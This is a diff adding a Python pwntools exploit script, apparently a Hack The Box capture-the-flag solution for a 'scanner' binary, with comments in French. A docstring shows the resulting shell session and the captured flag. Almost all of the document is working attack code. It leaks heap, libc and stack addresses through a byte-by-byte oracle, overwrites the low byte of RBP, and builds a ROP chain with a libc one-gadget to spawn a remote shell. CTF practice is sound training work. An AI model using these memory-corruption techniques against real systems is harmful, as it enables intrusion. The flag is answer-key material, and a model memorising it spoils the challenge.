@@ -1,0 +1,155 @@
+"""
+Resultat : 
+
+[DEBUG] Sent 0x1 bytes:
+    b'\n'
+$ id
+[DEBUG] Sent 0x3 bytes:
+    b'id\n'
+[DEBUG] Received 0x2a bytes:
+    b'uid=999(ctf) gid=999(ctf) groups=999(ctf)\n'
+uid=999(ctf) gid=999(ctf) groups=999(ctf)
+$ ls
+[DEBUG] Sent 0x3 bytes:
+    b'ls\n'
+[DEBUG] Received 0x26 bytes:
+    b'flag.txt\n'
+    b'ld-2.31.so\n'
+    b'libc.so.6\n'
+    b'scanner\n'
+flag.txt
+ld-2.31.so
+libc.so.6
+scanner
+$ cat flag.txt
+[DEBUG] Sent 0xd bytes:
+    b'cat flag.txt\n'
+[DEBUG] Received 0x35 bytes:
+    b'HTB{bU7_H0w???_1_uS3d_sC@nF_w1tH_L3nGtH_cH3Ck1nG!!!}\n'
+HTB{bU7_H0w???_1_uS3d_sC@nF_w1tH_L3nGtH_cH3Ck1nG!!!}
+"""
+
+
+#!/usr/bin/python3
+from pwn import *
+
+binary = ELF("./scanner", checksec=False)
+libc_obj = ELF("./libc.so.6", checksec=False)
+
+context.binary = binary
+context.log_level = "DEBUG"
+
+connection = remote("94.237.52.208", 55126)
+connection.timeout = 0.2
+
+def send_update_buffer(data):
+    connection.sendafter(b"> ", b"1")
+    connection.sendafter(b"buffer: ", data)
+
+def send_update_buffer_leak(data):
+    connection.sendlineafter(b"> ", b"1")
+    connection.sendlineafter(b"buffer: ", data)
+
+def send_update_buffer_rop(data):
+    connection.sendlineafter(b"> ", b"1")
+    connection.sendafter(b"buffer: ", data)
+
+def trigger_scanner(name="naive1", length=2, pattern=b'\x66\x00'):
+    connection.sendlineafter(b"> ", b"3")
+    connection.sendlineafter(b"parameters: ", f"{name} {length}".encode())
+    connection.sendline(pattern)
+    return connection.recv(timeout=3)
+
+# Phase 1: Oracle attack pour leak d'adresses byte par byte
+def leak_memory():
+    prefix_bytes = b"\x66\x00"
+    known_bytes = b''
+    dynamic_val = 0
+    dyn_byte_val = 0
+    scan_length = 3
+
+    while len(known_bytes) < 48:
+        for guess_byte in range(256):
+            if len(known_bytes) >= 9:
+                known_bytes = known_bytes[:8] + p8(dynamic_val) + known_bytes[9:]
+                if dyn_byte_val == 0:
+                    dyn_byte_val = known_bytes[1:2]
+            if dynamic_val == 0x19:
+                known_bytes = p8(0xc0) + known_bytes[1:]
+            if dynamic_val == 0x29:
+                known_bytes = p8(0xf0) + known_bytes[1:]
+            if dynamic_val == 0x39:
+                known_bytes = p8(0x30) + p8(u8(dyn_byte_val)+1) + known_bytes[2:]
+            if dynamic_val == 0x49:
+                known_bytes = p8(0x80) + p8(u8(dyn_byte_val)+1) + known_bytes[2:]
+            if dynamic_val == 0x59:
+                known_bytes = p8(0xe0) + p8(u8(dyn_byte_val)+1) + known_bytes[2:]
+
+            test_payload = prefix_bytes + known_bytes + p8(guess_byte)
+            response = trigger_scanner(length=scan_length, pattern=test_payload)
+
+            if b"Found" in response:
+                known_bytes += p8(guess_byte)
+                scan_length += 1
+                if len(known_bytes) >= 9:
+                    if dynamic_val == 0:
+                        dynamic_val = guess_byte
+                    dynamic_val += 1
+                break
+
+    return known_bytes
+
+# Phase 2: Overflow du LSB de RBP via vuln dans le nom du scanner
+def overwrite_rbp_byte():
+    trigger_scanner(name="w" * 16, length=2, pattern=b'\x66\x77')
+
+# Phase 3: Calcul du padding nécessaire pour atteindre RBP
+def compute_padding(addr_4):
+    buffer_addr = addr_4 - 0x1108
+    rbp_addr = addr_4 - 0xf8
+    rbp_lsb_byte = p64(rbp_addr)[0]
+    rbp_corrected = rbp_addr - rbp_lsb_byte
+    padding_val = buffer_addr - rbp_corrected
+    return (abs(padding_val) - 16, rbp_lsb_byte)
+
+# Étape 1: Leak initial
+initial_leak = b"w" * 4094 + b"f"
+send_update_buffer_leak(initial_leak)
+
+# Étape 2: Leak des adresses mémoire byte par byte
+memory_leak = leak_memory()
+
+heap_addr = u64(memory_leak[:8]) # heap
+libc_leak_addr = u64(memory_leak[24:32]) # libc
+stack_addr = u64(memory_leak[40:48]) # stack
+
+# Étape 4: Calcul bases mémoires
+libc_base_addr = libc_leak_addr - 0x24083
+libc_obj.address = libc_base_addr
+heap_base_addr = heap_addr - 0x2f0
+
+# Étape 5: Calcul du padding vers RBP
+padding_len, rbp_lsb_val = compute_padding(stack_addr)
+padding_len += 1
+
+exploit_data = b'w' * padding_len 
+exploit_data += p64(heap_addr - 0x50)    # Nouveau RBP 
+exploit_data += p64(0x000000000003)
+exploit_data += p64(0xaaaaaaaaaaaa) # Padding
+exploit_data += p64(libc_base_addr + 0xe3b01)  # One gadget ([rsp+0x60] == NULL)
+exploit_data += b'w' * (4096 - padding_len - 32)
+
+send_update_buffer(exploit_data)
+overwrite_rbp_byte()
+sleep(1)
+
+# Étape 8: Construction de la ROP chain 
+rop_padding = rbp_lsb_val - 56
+rop_chain = b'\x00' * rop_padding
+rop_chain += p64(libc_base_addr + 0x22679)
+rop_chain += p64(libc_base_addr + 0xe3afe)
+rop_chain += b'\x00' * (4096 - rop_padding - 16)
+
+send_update_buffer_rop(rop_chain)
+sleep(1)
+connection.interactive()
